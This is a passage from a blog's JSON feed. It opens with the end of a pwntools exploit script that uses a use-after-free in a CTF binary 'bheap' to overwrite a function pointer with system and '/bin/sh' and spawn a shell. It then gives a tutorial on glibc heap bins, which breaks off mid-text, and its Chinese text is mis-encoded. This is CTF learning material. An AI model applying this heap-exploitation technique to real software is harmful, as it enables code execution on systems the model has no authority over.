gdb.debug('./bheap')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = process('./bheap')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bheap'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input size: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input content: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tse<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input list index: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Print</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'Please input list index: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tse<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>system <span class=\"token operator\">=</span> <span class=\"token number\">0x4007A0</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token number\">0x0602010</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>Print<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "Â†Ü",
                "uaf"
            ]
        },
        {
            "id": "http://example.com/2023/08/09/bins/",
            "url": "http://example.com/2023/08/09/bins/",
            "title": "bins",
            "date_published": "2023-08-09T02:57:17.000Z",
            "content_html": "<h1 id=\"pwnÂ†Ü-binsÂ≠¶‰π†\"><a class=\"markdownIt-Anchor\" href=\"#pwnÂ†Ü-binsÂ≠¶‰π†\">#</a> pwn Â†Ü bins Â≠¶‰π†„ÄÇ</h1>\n<h2 id=\"‰∏Ä-binÈìæÁöÑ‰ªãÁªç\"><a class=\"markdownIt-Anchor\" href=\"#‰∏Ä-binÈìæÁöÑ‰ªãÁªç\">#</a> ‰∏Ä„ÄÅbin ÈìæÁöÑ‰ªãÁªç</h2>\n<p>bin ÊòØ‰∏Ä‰∏™Áî± struct chunk ÁªìÊûÑ‰ΩìÁªÑÊàêÁöÑÈìæË°®„ÄÇ<br>\nÂâçÈù¢‰ªãÁªçËøáÔºå‰∏çÂêåÁöÑ chunk Ê†πÊçÆÁâπÁÇπ‰∏çÂêåÂàÜ‰∏∫‰∏çÂêåÁöÑ chunkÔºå‰∏∫‰∫ÜÂ∞ÜËøô‰∫õ chunk ËøõË°åÂàÜÁ±ªÁöÑÁÆ°ÁêÜÔºåglibc ÈááÁî®‰∫Ü bin ÈìæËøôÁßçÊñπÂºèÁÆ°ÁêÜ‰∏çÂêåÁöÑ chunk„ÄÇ<br>\n‰∏çÂêåÁöÑ bin ÈìæÊòØÁî± arena ÁÆ°ÁêÜÁöÑ„ÄÇ<br>\nbin Èìæ‰∏≠ÁöÑ chunk Âùá‰∏∫ free chunk„ÄÇ</p>\n<h2 id=\"‰∫å-binÈìæÂàÜÁ±ª\"><a class=\"markdownIt-Anchor\" href=\"#‰∫å-binÈìæÂàÜÁ±ª\">#</a> ‰∫å„ÄÅbin ÈìæÂàÜÁ±ª</h2>\n<ul>\n<li>Ê†πÊçÆ bin ÈìæÊàêÂëòÁöÑÂ§ßÂ∞è‰∏çÂêåÔºåÂàÜ‰∏∫‰ª•‰∏ãÂá†Á±ªÔºö\n<ul>\n<li>fast bin ÊòØÂçïÈìæË°®ÔºåÂÖ∂‰ªñÈÉΩÊòØÂèåÂêëÈìæË°®„ÄÇ</li>\n<li><strong>Fast bin„ÄÇ</strong></li>\n<li><strong>Unsorted bin„ÄÇ</strong></li>\n<li><strong>Small bin„ÄÇ</strong></li>\n<li><strong>Large bin„ÄÇ</strong></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"‰∏â-binÈìæÁöÑ‰øùÂ≠òstruct-malloc_stateÁªìÊûÑ‰Ωì\"><a class=\"markdownIt-Anchor\" href=\"#‰∏â-binÈìæÁöÑ‰øùÂ≠òstruct-malloc_stateÁªìÊûÑ‰Ωì\">#</a> ‰∏â„ÄÅbin ÈìæÁöÑ‰øùÂ≠òÔºàstruct malloc_state ÁªìÊûÑ‰ΩìÔºâ</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span><span class=\"token operator\">*</span> mchunkptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_chunk</span> <span class=\"token operator\">*</span>mfastbinptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">malloc_state</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">/*other member*/</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">/* Fastbins */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  mfastbinptr fastbinsY<span class=\"token punctuation\">[</span>NFASTBINS<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">/* Normal bins packed as described above */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  mchunkptr bins<span class=\"token punctuation\">[</span>NBINS <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">/*other member*/</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>ÂâçÈù¢ËØ¥ËøáÔºå‰∏çÂêåÁöÑ bin ÈìæÊòØÁî± arena ÁÆ°ÁêÜÁöÑ„ÄÇÂõ†Ê≠§‰∏Ä‰∏™Á∫øÁ®ã‰∏≠‰ºöÊúâÂæàÂ§öÁöÑ bin ÈìæÔºåËøô‰∫õ bin ÈìæÈÉΩÊúâ arena ÊâÄË°®Á§∫ÁöÑ struct malloc_state ÁªìÊûÑ‰ΩìÁöÑ‰ª•‰∏ãÊàêÂëò‰øùÂ≠òÔºö<br>\nfastbinY Êï∞ÁªÑÔºöÂ§ßÂ∞è‰∏∫ 10„ÄÇËÆ∞ÂΩïÁöÑÊòØ fast bin Èìæ„ÄÇ<br>\nbins Êï∞ÁªÑÔºöÂ§ßÂ∞è‰∏∫ 129„ÄÇËÆ∞ÂΩïÁöÑÊòØ unsorted binÔºà1Ôºâ„ÄÅsmall binÔºà2~63Ôºâ„ÄÅlarge bin ÈìæÔºà64~126Ôºâ„ÄÇ<br>\n<img data-src=\"/img/bins/4.jpg\" alt=\"img\"></p>\n</blockquote>\n<h2 id=\"Âõõ-fast-bin\"><a class=\"markdownIt-Anchor\" href=\"#Âõõ-fast-bin\">#</a> Âõõ„ÄÅFast Bin</h2>\n<p>Ê¶ÇÂøµÔºöchunk ÁöÑÂ§ßÂ∞èÂú® 32 Â≠óËäÇ ‚Äî‚Äî128 Â≠óËäÇÔºà0x20‚Äî‚Äî0x80ÔºâÁöÑ chunk Áß∞‰∏∫ ‚Äúfast chunk‚ÄùÔºàÂ§ßÂ∞è‰∏çÊòØ malloc Êó∂ÁöÑÂ§ßÂ∞èÔºåËÄåÊòØÂú®ÂÜÖÂ≠ò‰∏≠ struct malloc_chunk ÁöÑÂ§ßÂ∞èÔºåÂåÖÂê´Ââç 2 ‰∏™ÊàêÂëòÔºâ„ÄÇ<br>\nfast bin ÈìæË°®ÁöÑ‰∏™Êï∞‰∏∫ 10 ‰∏™„ÄÇ<br>\n‰∏ç‰ºöÂØπ free chunk ËøõË°åÂêàÂπ∂ÔºöÈâ¥‰∫éËÆæËÆ° fast bin ÁöÑÂàùË°∑Â∞±ÊòØËøõË°åÂø´ÈÄüÁöÑÂ∞èÂÜÖÂ≠òÂàÜÈÖçÂíåÈáäÊîæÔºåÂõ†Ê≠§Á≥ªÁªüÂ∞ÜÂ±û‰∫é fast bin ÁöÑ chunk ÁöÑ PREV_INUSE ‰ΩçÊÄªÊòØËÆæÁΩÆ‰∏∫ 1ÔºåËøôÊ†∑Âç≥‰ΩøÂΩì fast bin ‰∏≠ÊúâÊüê‰∏™ chunk Âêå‰∏Ä‰∏™ free chunk Áõ∏ÈÇªÁöÑÊó∂ÂÄôÔºåÁ≥ªÁªü‰πü‰∏ç‰ºöËøõË°åËá™Âä®ÂêàÂπ∂Êìç‰ΩúÔºåËÄåÊòØ‰øùÁïô‰∏§ËÄÖ„ÄÇËôΩÁÑ∂ËøôÊ†∑ÂÅöÂèØËÉΩ‰ºöÈÄ†ÊàêÈ¢ùÂ§ñÁöÑÁ¢éÁâáÂåñÈóÆÈ¢òÔºå‰ΩÜÁëï‰∏çÊé©Áëú„ÄÇ</p>\n<blockquote>\n<p>fastbinsY Êï∞ÁªÑÂ≠òÂÇ® fastbins ÁöÑËßÑÂàô</p>\n<ul>\n<li>\n<p>ÊØè‰∏™ fast bin ÈìæË°®ÈÉΩÊòØÂçïÈìæË°®Ôºà‰ΩøÁî® fd ÊåáÈíàÔºâ„ÄÇÂõ†Ê≠§Ôºåfast bin ‰∏≠Êó†ËÆ∫ÊòØÊ∑ªÂä†ËøòÊòØÁßªÈô§ fast chunkÔºåÈÉΩÊòØÂØπ ‚ÄúÈìæË°®Â∞æ‚Äù ËøõË°åÊìç‰ΩúÔºåËÄå‰∏ç‰ºöÂØπÊüê‰∏™‰∏≠Èó¥ÁöÑ fast chunk ËøõË°åÊìç‰Ωú„ÄÇ</p>\n</li>\n<li>\n<p>Âçï‰∏™ fastbin ÈìæË°®‰∏≠ÁöÑ chunk Â§ßÂ∞èÈÉΩÊòØÁõ∏ÂêåÁöÑÔºåÂêÑ‰∏™ fastbin ÈìæË°®‰∏≠ÁöÑ chunk Â§ßÂ∞èÊòØ‰∏çÂêåÁöÑ„ÄÇ</p>\n</li>\n<li>\n<p>fastbinY Êï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏™ bin ÈìæË°®ÁöÑÊéíÂ∫èÔºåÊòØÊåâÁÖßÈìæË°®ÂÖÉÁ¥†ÁöÑÂ§ßÂ∞èËøõË°åÊéíÂ∫èÁöÑ„ÄÇÊï∞ÁªÑÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÁöÑ fast bin ÈìæË°®‰∏≠ÁöÑÊØè‰∏™ chunk ÁöÑÂ§ßÂ∞èÊòØ 32 Â≠óËäÇÁöÑÔºåÊï∞ÁªÑÁöÑÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†ÁöÑ fast bin ÈìæË°®‰∏≠ÁöÑÊØè‰∏™ chunk ÁöÑÂ§ßÂ∞èÊòØ 48 Â≠óËäÇÁöÑ‚Ä¶ ÊØè‰∏™ÂÖÉÁ¥†ÈÉΩÊØîÂâçÈù¢ÁöÑ fast bin ÈìæÂ§ß 16 Â≠óËäÇÔºå‰ª•Ê≠§Á±ªÊé®ËøõË°åÊéíÂ∫è„ÄÇ</p>\n<p><img data-src=\"/img/bins/1.jpg\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>ÈìæË°®Á¥¢ÂºïÂÆèÂÆö‰πâÔºöÔºàfastbin_indexÔºâ</p>\n<ul>\n<li>\n<p>** ÂäüËÉΩÔºö** ÈÄöËøáÊ≠§ÂÆèËÉΩÂà§Êñ≠Êüê‰∏Ä‰∏™ fastchunk Â±û‰∫éÂì™‰∏Ä‰∏™ fastbin ÈìæË°®„ÄÇ</p>\n</li>\n<li>\n<p>** ÂèÇÊï∞Ôºö** Êüê‰∏Ä‰∏™ chunk ÁöÑÂ§ßÂ∞è„ÄÇ</p>\n<p><img data-src=\"/img/bins/20190730083911707.png\" alt=\"img\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>malloc Êìç‰Ωú‰∏é fastbins ÁöÑÂàùÂßãÂåñÔºö<br>\nÂΩìÂ∫îÁî®Â±ÇÈÄöËøá malloc ÂáΩÊï∞Á¨¨‰∏ÄÊ¨°Áî≥ËØ∑ÁöÑ chunk Â±û‰∫é 16 Â≠óËäÇÔΩû80 Â≠óËäÇ‰πãÈó¥Êó∂ÔºåÂõ†‰∏∫ÂàùÂßãÂåñÁöÑÊó∂ÂÄô fast bin ÊîØÊåÅÁöÑÊúÄÂ§ßÂÜÖÂ≠òÂ§ßÂ∞è‰ª•ÂèäÊâÄÊúâ fast bin ÈìæË°®ÈÉΩÊòØÁ©∫ÁöÑÔºåÊâÄ‰ª•ÂÆÉ‰πü‰∏ç‰ºö‰∫§Áî± fast bin Êù•Â§ÑÁêÜÔºåËÄåÊòØÂêë‰∏ã‰º†ÈÄí‰∫§Áî± small bin Êù•Â§ÑÁêÜÔºåÂ¶ÇÊûú small bin ‰πü‰∏∫Á©∫ÁöÑËØùÂ∞±‰∫§Áªô unsorted bin Â§ÑÁêÜ„ÄÇ</li>\n<li>ÈÇ£‰πàÔºåfast bin Â¶Ç‰ΩïËøõË°åÂàùÂßãÂåñÂì™Ôºü<br>\nÂΩìÊàë‰ª¨Á¨¨‰∏ÄÊ¨°Ë∞ÉÁî® malloc (fast bin) ÁöÑÊó∂ÂÄôÔºåÁ≥ªÁªüÊâßË°å_int_malloc ÂáΩÊï∞ÔºåËØ•ÂáΩÊï∞È¶ñÂÖà‰ºöÂèëÁé∞ÂΩìÂâç fast bin ‰∏∫Á©∫ÔºåÂ∞±ËΩ¨‰∫§Áªô small bin Â§ÑÁêÜÔºåËøõËÄåÂèàÂèëÁé∞ small bin ‰πü‰∏∫Á©∫ÔºåÂ∞±Ë∞ÉÁî® malloc_consolidate ÂáΩÊï∞ÂØπ malloc_state ÁªìÊûÑ‰ΩìËøõË°åÂàùÂßãÂåñ„ÄÇmalloc_consolidate ÂáΩÊï∞‰∏ªË¶ÅÂÆåÊàê‰ª•‰∏ãÂá†‰∏™ÂäüËÉΩÔºö<br>\na  È¶ñÂÖàÂà§Êñ≠ÂΩìÂâç malloc_state ÁªìÊûÑ‰Ωì‰∏≠ÁöÑ fast bin ÊòØÂê¶‰∏∫Á©∫ÔºåÂ¶ÇÊûú‰∏∫Á©∫Â∞±ËØ¥ÊòéÊï¥‰∏™ malloc_state ÈÉΩÊ≤°ÊúâÂÆåÊàêÂàùÂßãÂåñÔºåÈúÄË¶ÅÂØπ malloc_state ËøõË°åÂàùÂßãÂåñ„ÄÇ<br>\nb  malloc_state ÁöÑÂàùÂßãÂåñÊìç‰ΩúÁî±ÂáΩÊï∞ malloc_init_state (av) ÂÆåÊàêÔºåËØ•ÂáΩÊï∞ÂÖàÂàùÂßãÂåñÈô§ fast bin ‰πãÂ§ñÁöÑÊâÄÊúâÁöÑ binsÔºåÂÜçÂàùÂßãÂåñ fast bins„ÄÇ<br>\nÈÇ£‰πàÂΩìÂÜçÊ¨°ÊâßË°å malloc (fast chunk) ÂáΩÊï∞ÁöÑÊó∂ÂÄôÔºåÊ≠§Êó∂ fast bin Áõ∏ÂÖ≥Êï∞ÊçÆ‰∏ç‰∏∫Á©∫‰∫ÜÔºåÂ∞±ÂèØ‰ª•‰ΩøÁî® fast bin„ÄÇ</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>free Êìç‰Ωú<br>\nËøô‰∏™Êìç‰ΩúÂæàÁÆÄÂçïÔºå‰∏ªË¶ÅÂàÜ‰∏∫‰∏§Ê≠•ÔºöÂÖàÈÄöËøá chunksize ÂáΩÊï∞Ê†πÊçÆ‰º†ÂÖ•ÁöÑÂú∞ÂùÄÊåáÈíàËé∑ÂèñËØ•ÊåáÈíàÂØπÂ∫îÁöÑ chunk ÁöÑÂ§ßÂ∞èÔºõÁÑ∂ÂêéÊ†πÊçÆËøô‰∏™ chunk Â§ßÂ∞èËé∑ÂèñËØ• chunk ÊâÄÂ±ûÁöÑ fast binÔºåÁÑ∂ÂêéÂÜçÂ∞ÜÊ≠§ chunk Ê∑ªÂä†Âà∞ËØ• fast bin ÁöÑÈìæÂ∞æÂç≥ÂèØ„ÄÇÊï¥‰∏™Êìç‰ΩúÈÉΩÊòØÂú®_int_free ÂáΩÊï∞‰∏≠ÂÆåÊàê„ÄÇ</li>\n</ul>\n</blockquote>\n<h2 id=\"‰∫î-unsorted-bin\"><a class=\"markdownIt-Anchor\" href=\"#‰∫î-unsorted-bin\">#</a> ‰∫î„ÄÅUnsorted Bin</h2>\n<p>‰ΩïÊó∂‰ΩøÁî®ÔºöÂΩìÈáäÊîæËæÉÂ∞èÊàñËæÉÂ§ßÁöÑ chunk ÁöÑÊó∂ÂÄôÔºåÂ¶ÇÊûúÁ≥ªÁªüÊ≤°ÊúâÂ∞ÜÂÆÉ‰ª¨Ê∑ªÂä†Âà∞ÂØπÂ∫îÁöÑ bins ‰∏≠ÔºåÁ≥ªÁªüÂ∞±Â∞ÜËøô‰∫õ chunk Ê∑ªÂä†Âà∞ unsorted bin ‰∏≠„ÄÇ<br>\nÁõÆÁöÑÔºöËøô‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜËÆ© ‚Äúglibc malloc Êú∫Âà∂‚Äù ËÉΩÂ§üÊúâÁ¨¨‰∫åÊ¨°Êú∫‰ºöÈáçÊñ∞Âà©Áî®ÊúÄËøëÈáäÊîæÁöÑ chunk (Á¨¨‰∏ÄÊ¨°Êú∫‰ºöÂ∞±ÊòØ fast bin 